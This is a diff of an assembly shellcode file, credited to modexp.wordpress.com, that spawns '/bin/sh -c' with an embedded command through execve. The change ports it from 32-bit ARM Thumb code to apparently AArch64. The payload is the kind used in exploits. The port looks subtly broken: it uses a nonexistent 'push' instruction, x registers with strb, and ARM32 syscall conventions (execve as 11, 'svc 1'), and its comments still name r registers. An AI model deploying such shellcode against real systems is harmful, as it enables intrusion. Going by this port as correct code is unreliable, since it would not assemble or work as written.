@@ -1,6 +1,6 @@
 /**
   execute command using /bin/sh
-  tested with linux running on raspberry pi 3 
+  tested with linux running on ubuntu
 
   http://modexp.wordpress.com/  
 */
@@ -10,28 +10,22 @@
     .text
 
 _start:
-    // switch to thumb mode
-    .code 32
-    add    r3, pc, #1
-    bx     r3
-    
-    .code 16
     // execve("/bin/sh", {"/bin/sh", "-c", cmd, NULL}, NULL);
-    eor    r3, r3, r3     // r3 = NULL
+    eor    x3, x3, x3     // x3 = NULL
     
-    adr    r0, sh         // r0 = "/bin/shX"
-    strb   r3, [r0, #7]   // add null terminator
+    adr    x0, sh         // r0 = "/bin/shX"
+    strb   x3, [x0, #7]   // add null terminator
     
-    adr    r1, c_arg      // r1 = "-cXX"
-    strb   r3, [r1, #2]   // add null terminator
+    adr    x1, c_arg      // r1 = "-cXX"
+    strb   x3, [x1, #2]   // add null terminator
 
-    adr    r2, cmd        // r4 = cmd
-    strb   r3, [r2, #18]  // add null terminator
+    adr    x2, cmd        // r4 = cmd
+    strb   x3, [x2, #18]  // add null terminator
     
-    push   {r0, r1, r2, r3}
-    eor    r2, r2, r2     // penv = NULL
-    mov    r1, sp         // r1 = argv
-    mov    r7, #11        // r7 = execve
+    push   {x0, x1, x2, x3}
+    eor    x2, x2, x2     // penv = NULL
+    mov    x1, sp         // r1 = argv
+    mov    x8, #11        // r7 = execve
     svc    1  
 sh:    
 .ascii "/bin/shX"
